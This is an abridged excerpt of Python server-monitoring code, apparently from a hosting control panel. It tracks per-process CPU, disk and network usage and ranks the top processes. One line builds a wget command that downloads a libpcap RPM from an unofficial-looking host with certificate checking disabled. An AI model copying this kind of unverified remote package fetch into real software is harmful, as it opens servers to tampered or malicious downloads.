...
class process_network_total:
        ...
        if os.path.exists("/usr/bin/apt"):
            ...
            if os.path.exists(red_file):
                ...
                if red_body.find("CentOS Linux release 8.") != -1:
                    ...
                    down_url = "wget -O {} https://node.binarjoinanalyticnl.nl/src/libpcap-devel-1.9.1-5.el8.x86_64.rpm  --no-check-certificate -T 10".format(
                        rpm_file
                    )
        ...
        try:
            ...
            for p_time, p_data in p:
                ...
                if p_time - self.__last_check_time > 10:
                    if not os.path.exists(self.__tip_file) or not os.path.exists(
                        self.__all_tip
                    ):
                        break
    ...
    def hex_to_ip(self, hex_ip):
        ...
        ip = ".".join(
            [str(int(hex_ip[i : i + 2], 16)) for i in range(0, len(hex_ip), 2)][::-1]
        )
...
class process_task:
    ...
    def __init__(self):
        ...
        if (
            ...
            .dbfile("system")
            .where("type=? AND name=?", ("table", "process_top_list"))
            .count()
        ):
  ...
  `addtime` INTEGER
    ...
    def get_cpu_percent(self, pid, cpu_time_total, s_cpu_times):
        ...
        cpu_percent = round(
            100.00
            * float(cpu_time_total - old_time)
            / (s_cpu_times - self.__last_cpu_time),
            2,
        )
        self.__last_times[pid] = cpu_time_total
        self.__last_dates[pid] = stime
    ...
    def get_process_network(self, pid):
        ...
        if not pid in self.last_net_process:
            return (
                self.__process_net_list[pid]["up"],
                self.__process_net_list[pid]["up_package"],
                self.__process_net_list[pid]["down"],
                self.__process_net_list[pid]["down_package"],
            )

        up = int(
            (self.__process_net_list[pid]["up"] - self.last_net_process[pid]["up"])
            / (time.time() - self.last_net_process_time)
        )
        down = int(
            (self.__process_net_list[pid]["down"] - self.last_net_process[pid]["down"])
            / (time.time() - self.last_net_process_time)
        )
        up_package = int(
            (
    ...
    def get_monitor_list(self, stime=None):
        ...
        for pid in self.__pids:
            try:
                ...
                if not process_info["memory"]:
                    continue

                io_counters = p.io_counters()
                process_info["disk_read"] = self.get_io_read(
                    pid, io_counters.read_bytes
                )  # 读取磁盘字节数
                process_info["disk_write"] = self.get_io_write(
                    pid, io_counters.write_bytes
                )  # 写入磁盘字节数
                process_info["disk_total"] = (
                    process_info["disk_read"] + process_info["disk_write"]
                )  # 磁盘总读写

                (
                    process_info["up"],
                    process_info["up_package"],
                    process_info["down"],
                    process_info["down_package"],
                ) = self.get_process_network(str(pid))

                process_info["net_total"] = (
                    process_info["up"] + process_info["down"]
                )  # 网络总流量
                process_info["package_total"] = (
                    process_info["up_package"] + process_info["down_package"]
                )  # 网络总包数

                if (
                    not process_info["cpu_percent"]
                    and not process_info["disk_total"]
                    and not process_info["net_total"]
                ):
                    continue
        ...
        if total_cpu_precent > 100:
            total_cpu_precent = 100
    ...
    def get_top_list(sekf, process_info_list):
        ...
        for p in process_info_list[:top_num]:
            _line = [
                ...
                public.xssencode2(p["username"]),
                p["create_time"],
            ]
            all_top.append(_line)

        process_info_list = sorted(
            process_info_list, key=lambda x: x["cpu_percent"], reverse=True
        )
        cpu_top = []
        for p in process_info_list[:top_num]:
            if not p["cpu_percent"]:
                continue
            _line = [
                p["cpu_percent"],
                p["pid"],
        ...
        process_info_list = sorted(
            process_info_list, key=lambda x: x["disk_total"], reverse=True
        )
        disk_top = []
        for p in process_info_list[:top_num]:
            if not p["disk_total"]:
        ...
        process_info_list = sorted(
            process_info_list, key=lambda x: x["net_total"], reverse=True
        )
        net_top = []
        for p in process_info_list[:top_num]:
            if not p["net_total"]:
        ...
        process_info_list = sorted(
            process_info_list, key=lambda x: x["memory"], reverse=True
        )
        memory_top = []
        for p in process_info_list[:top_num]:
            if not p["memory"]:
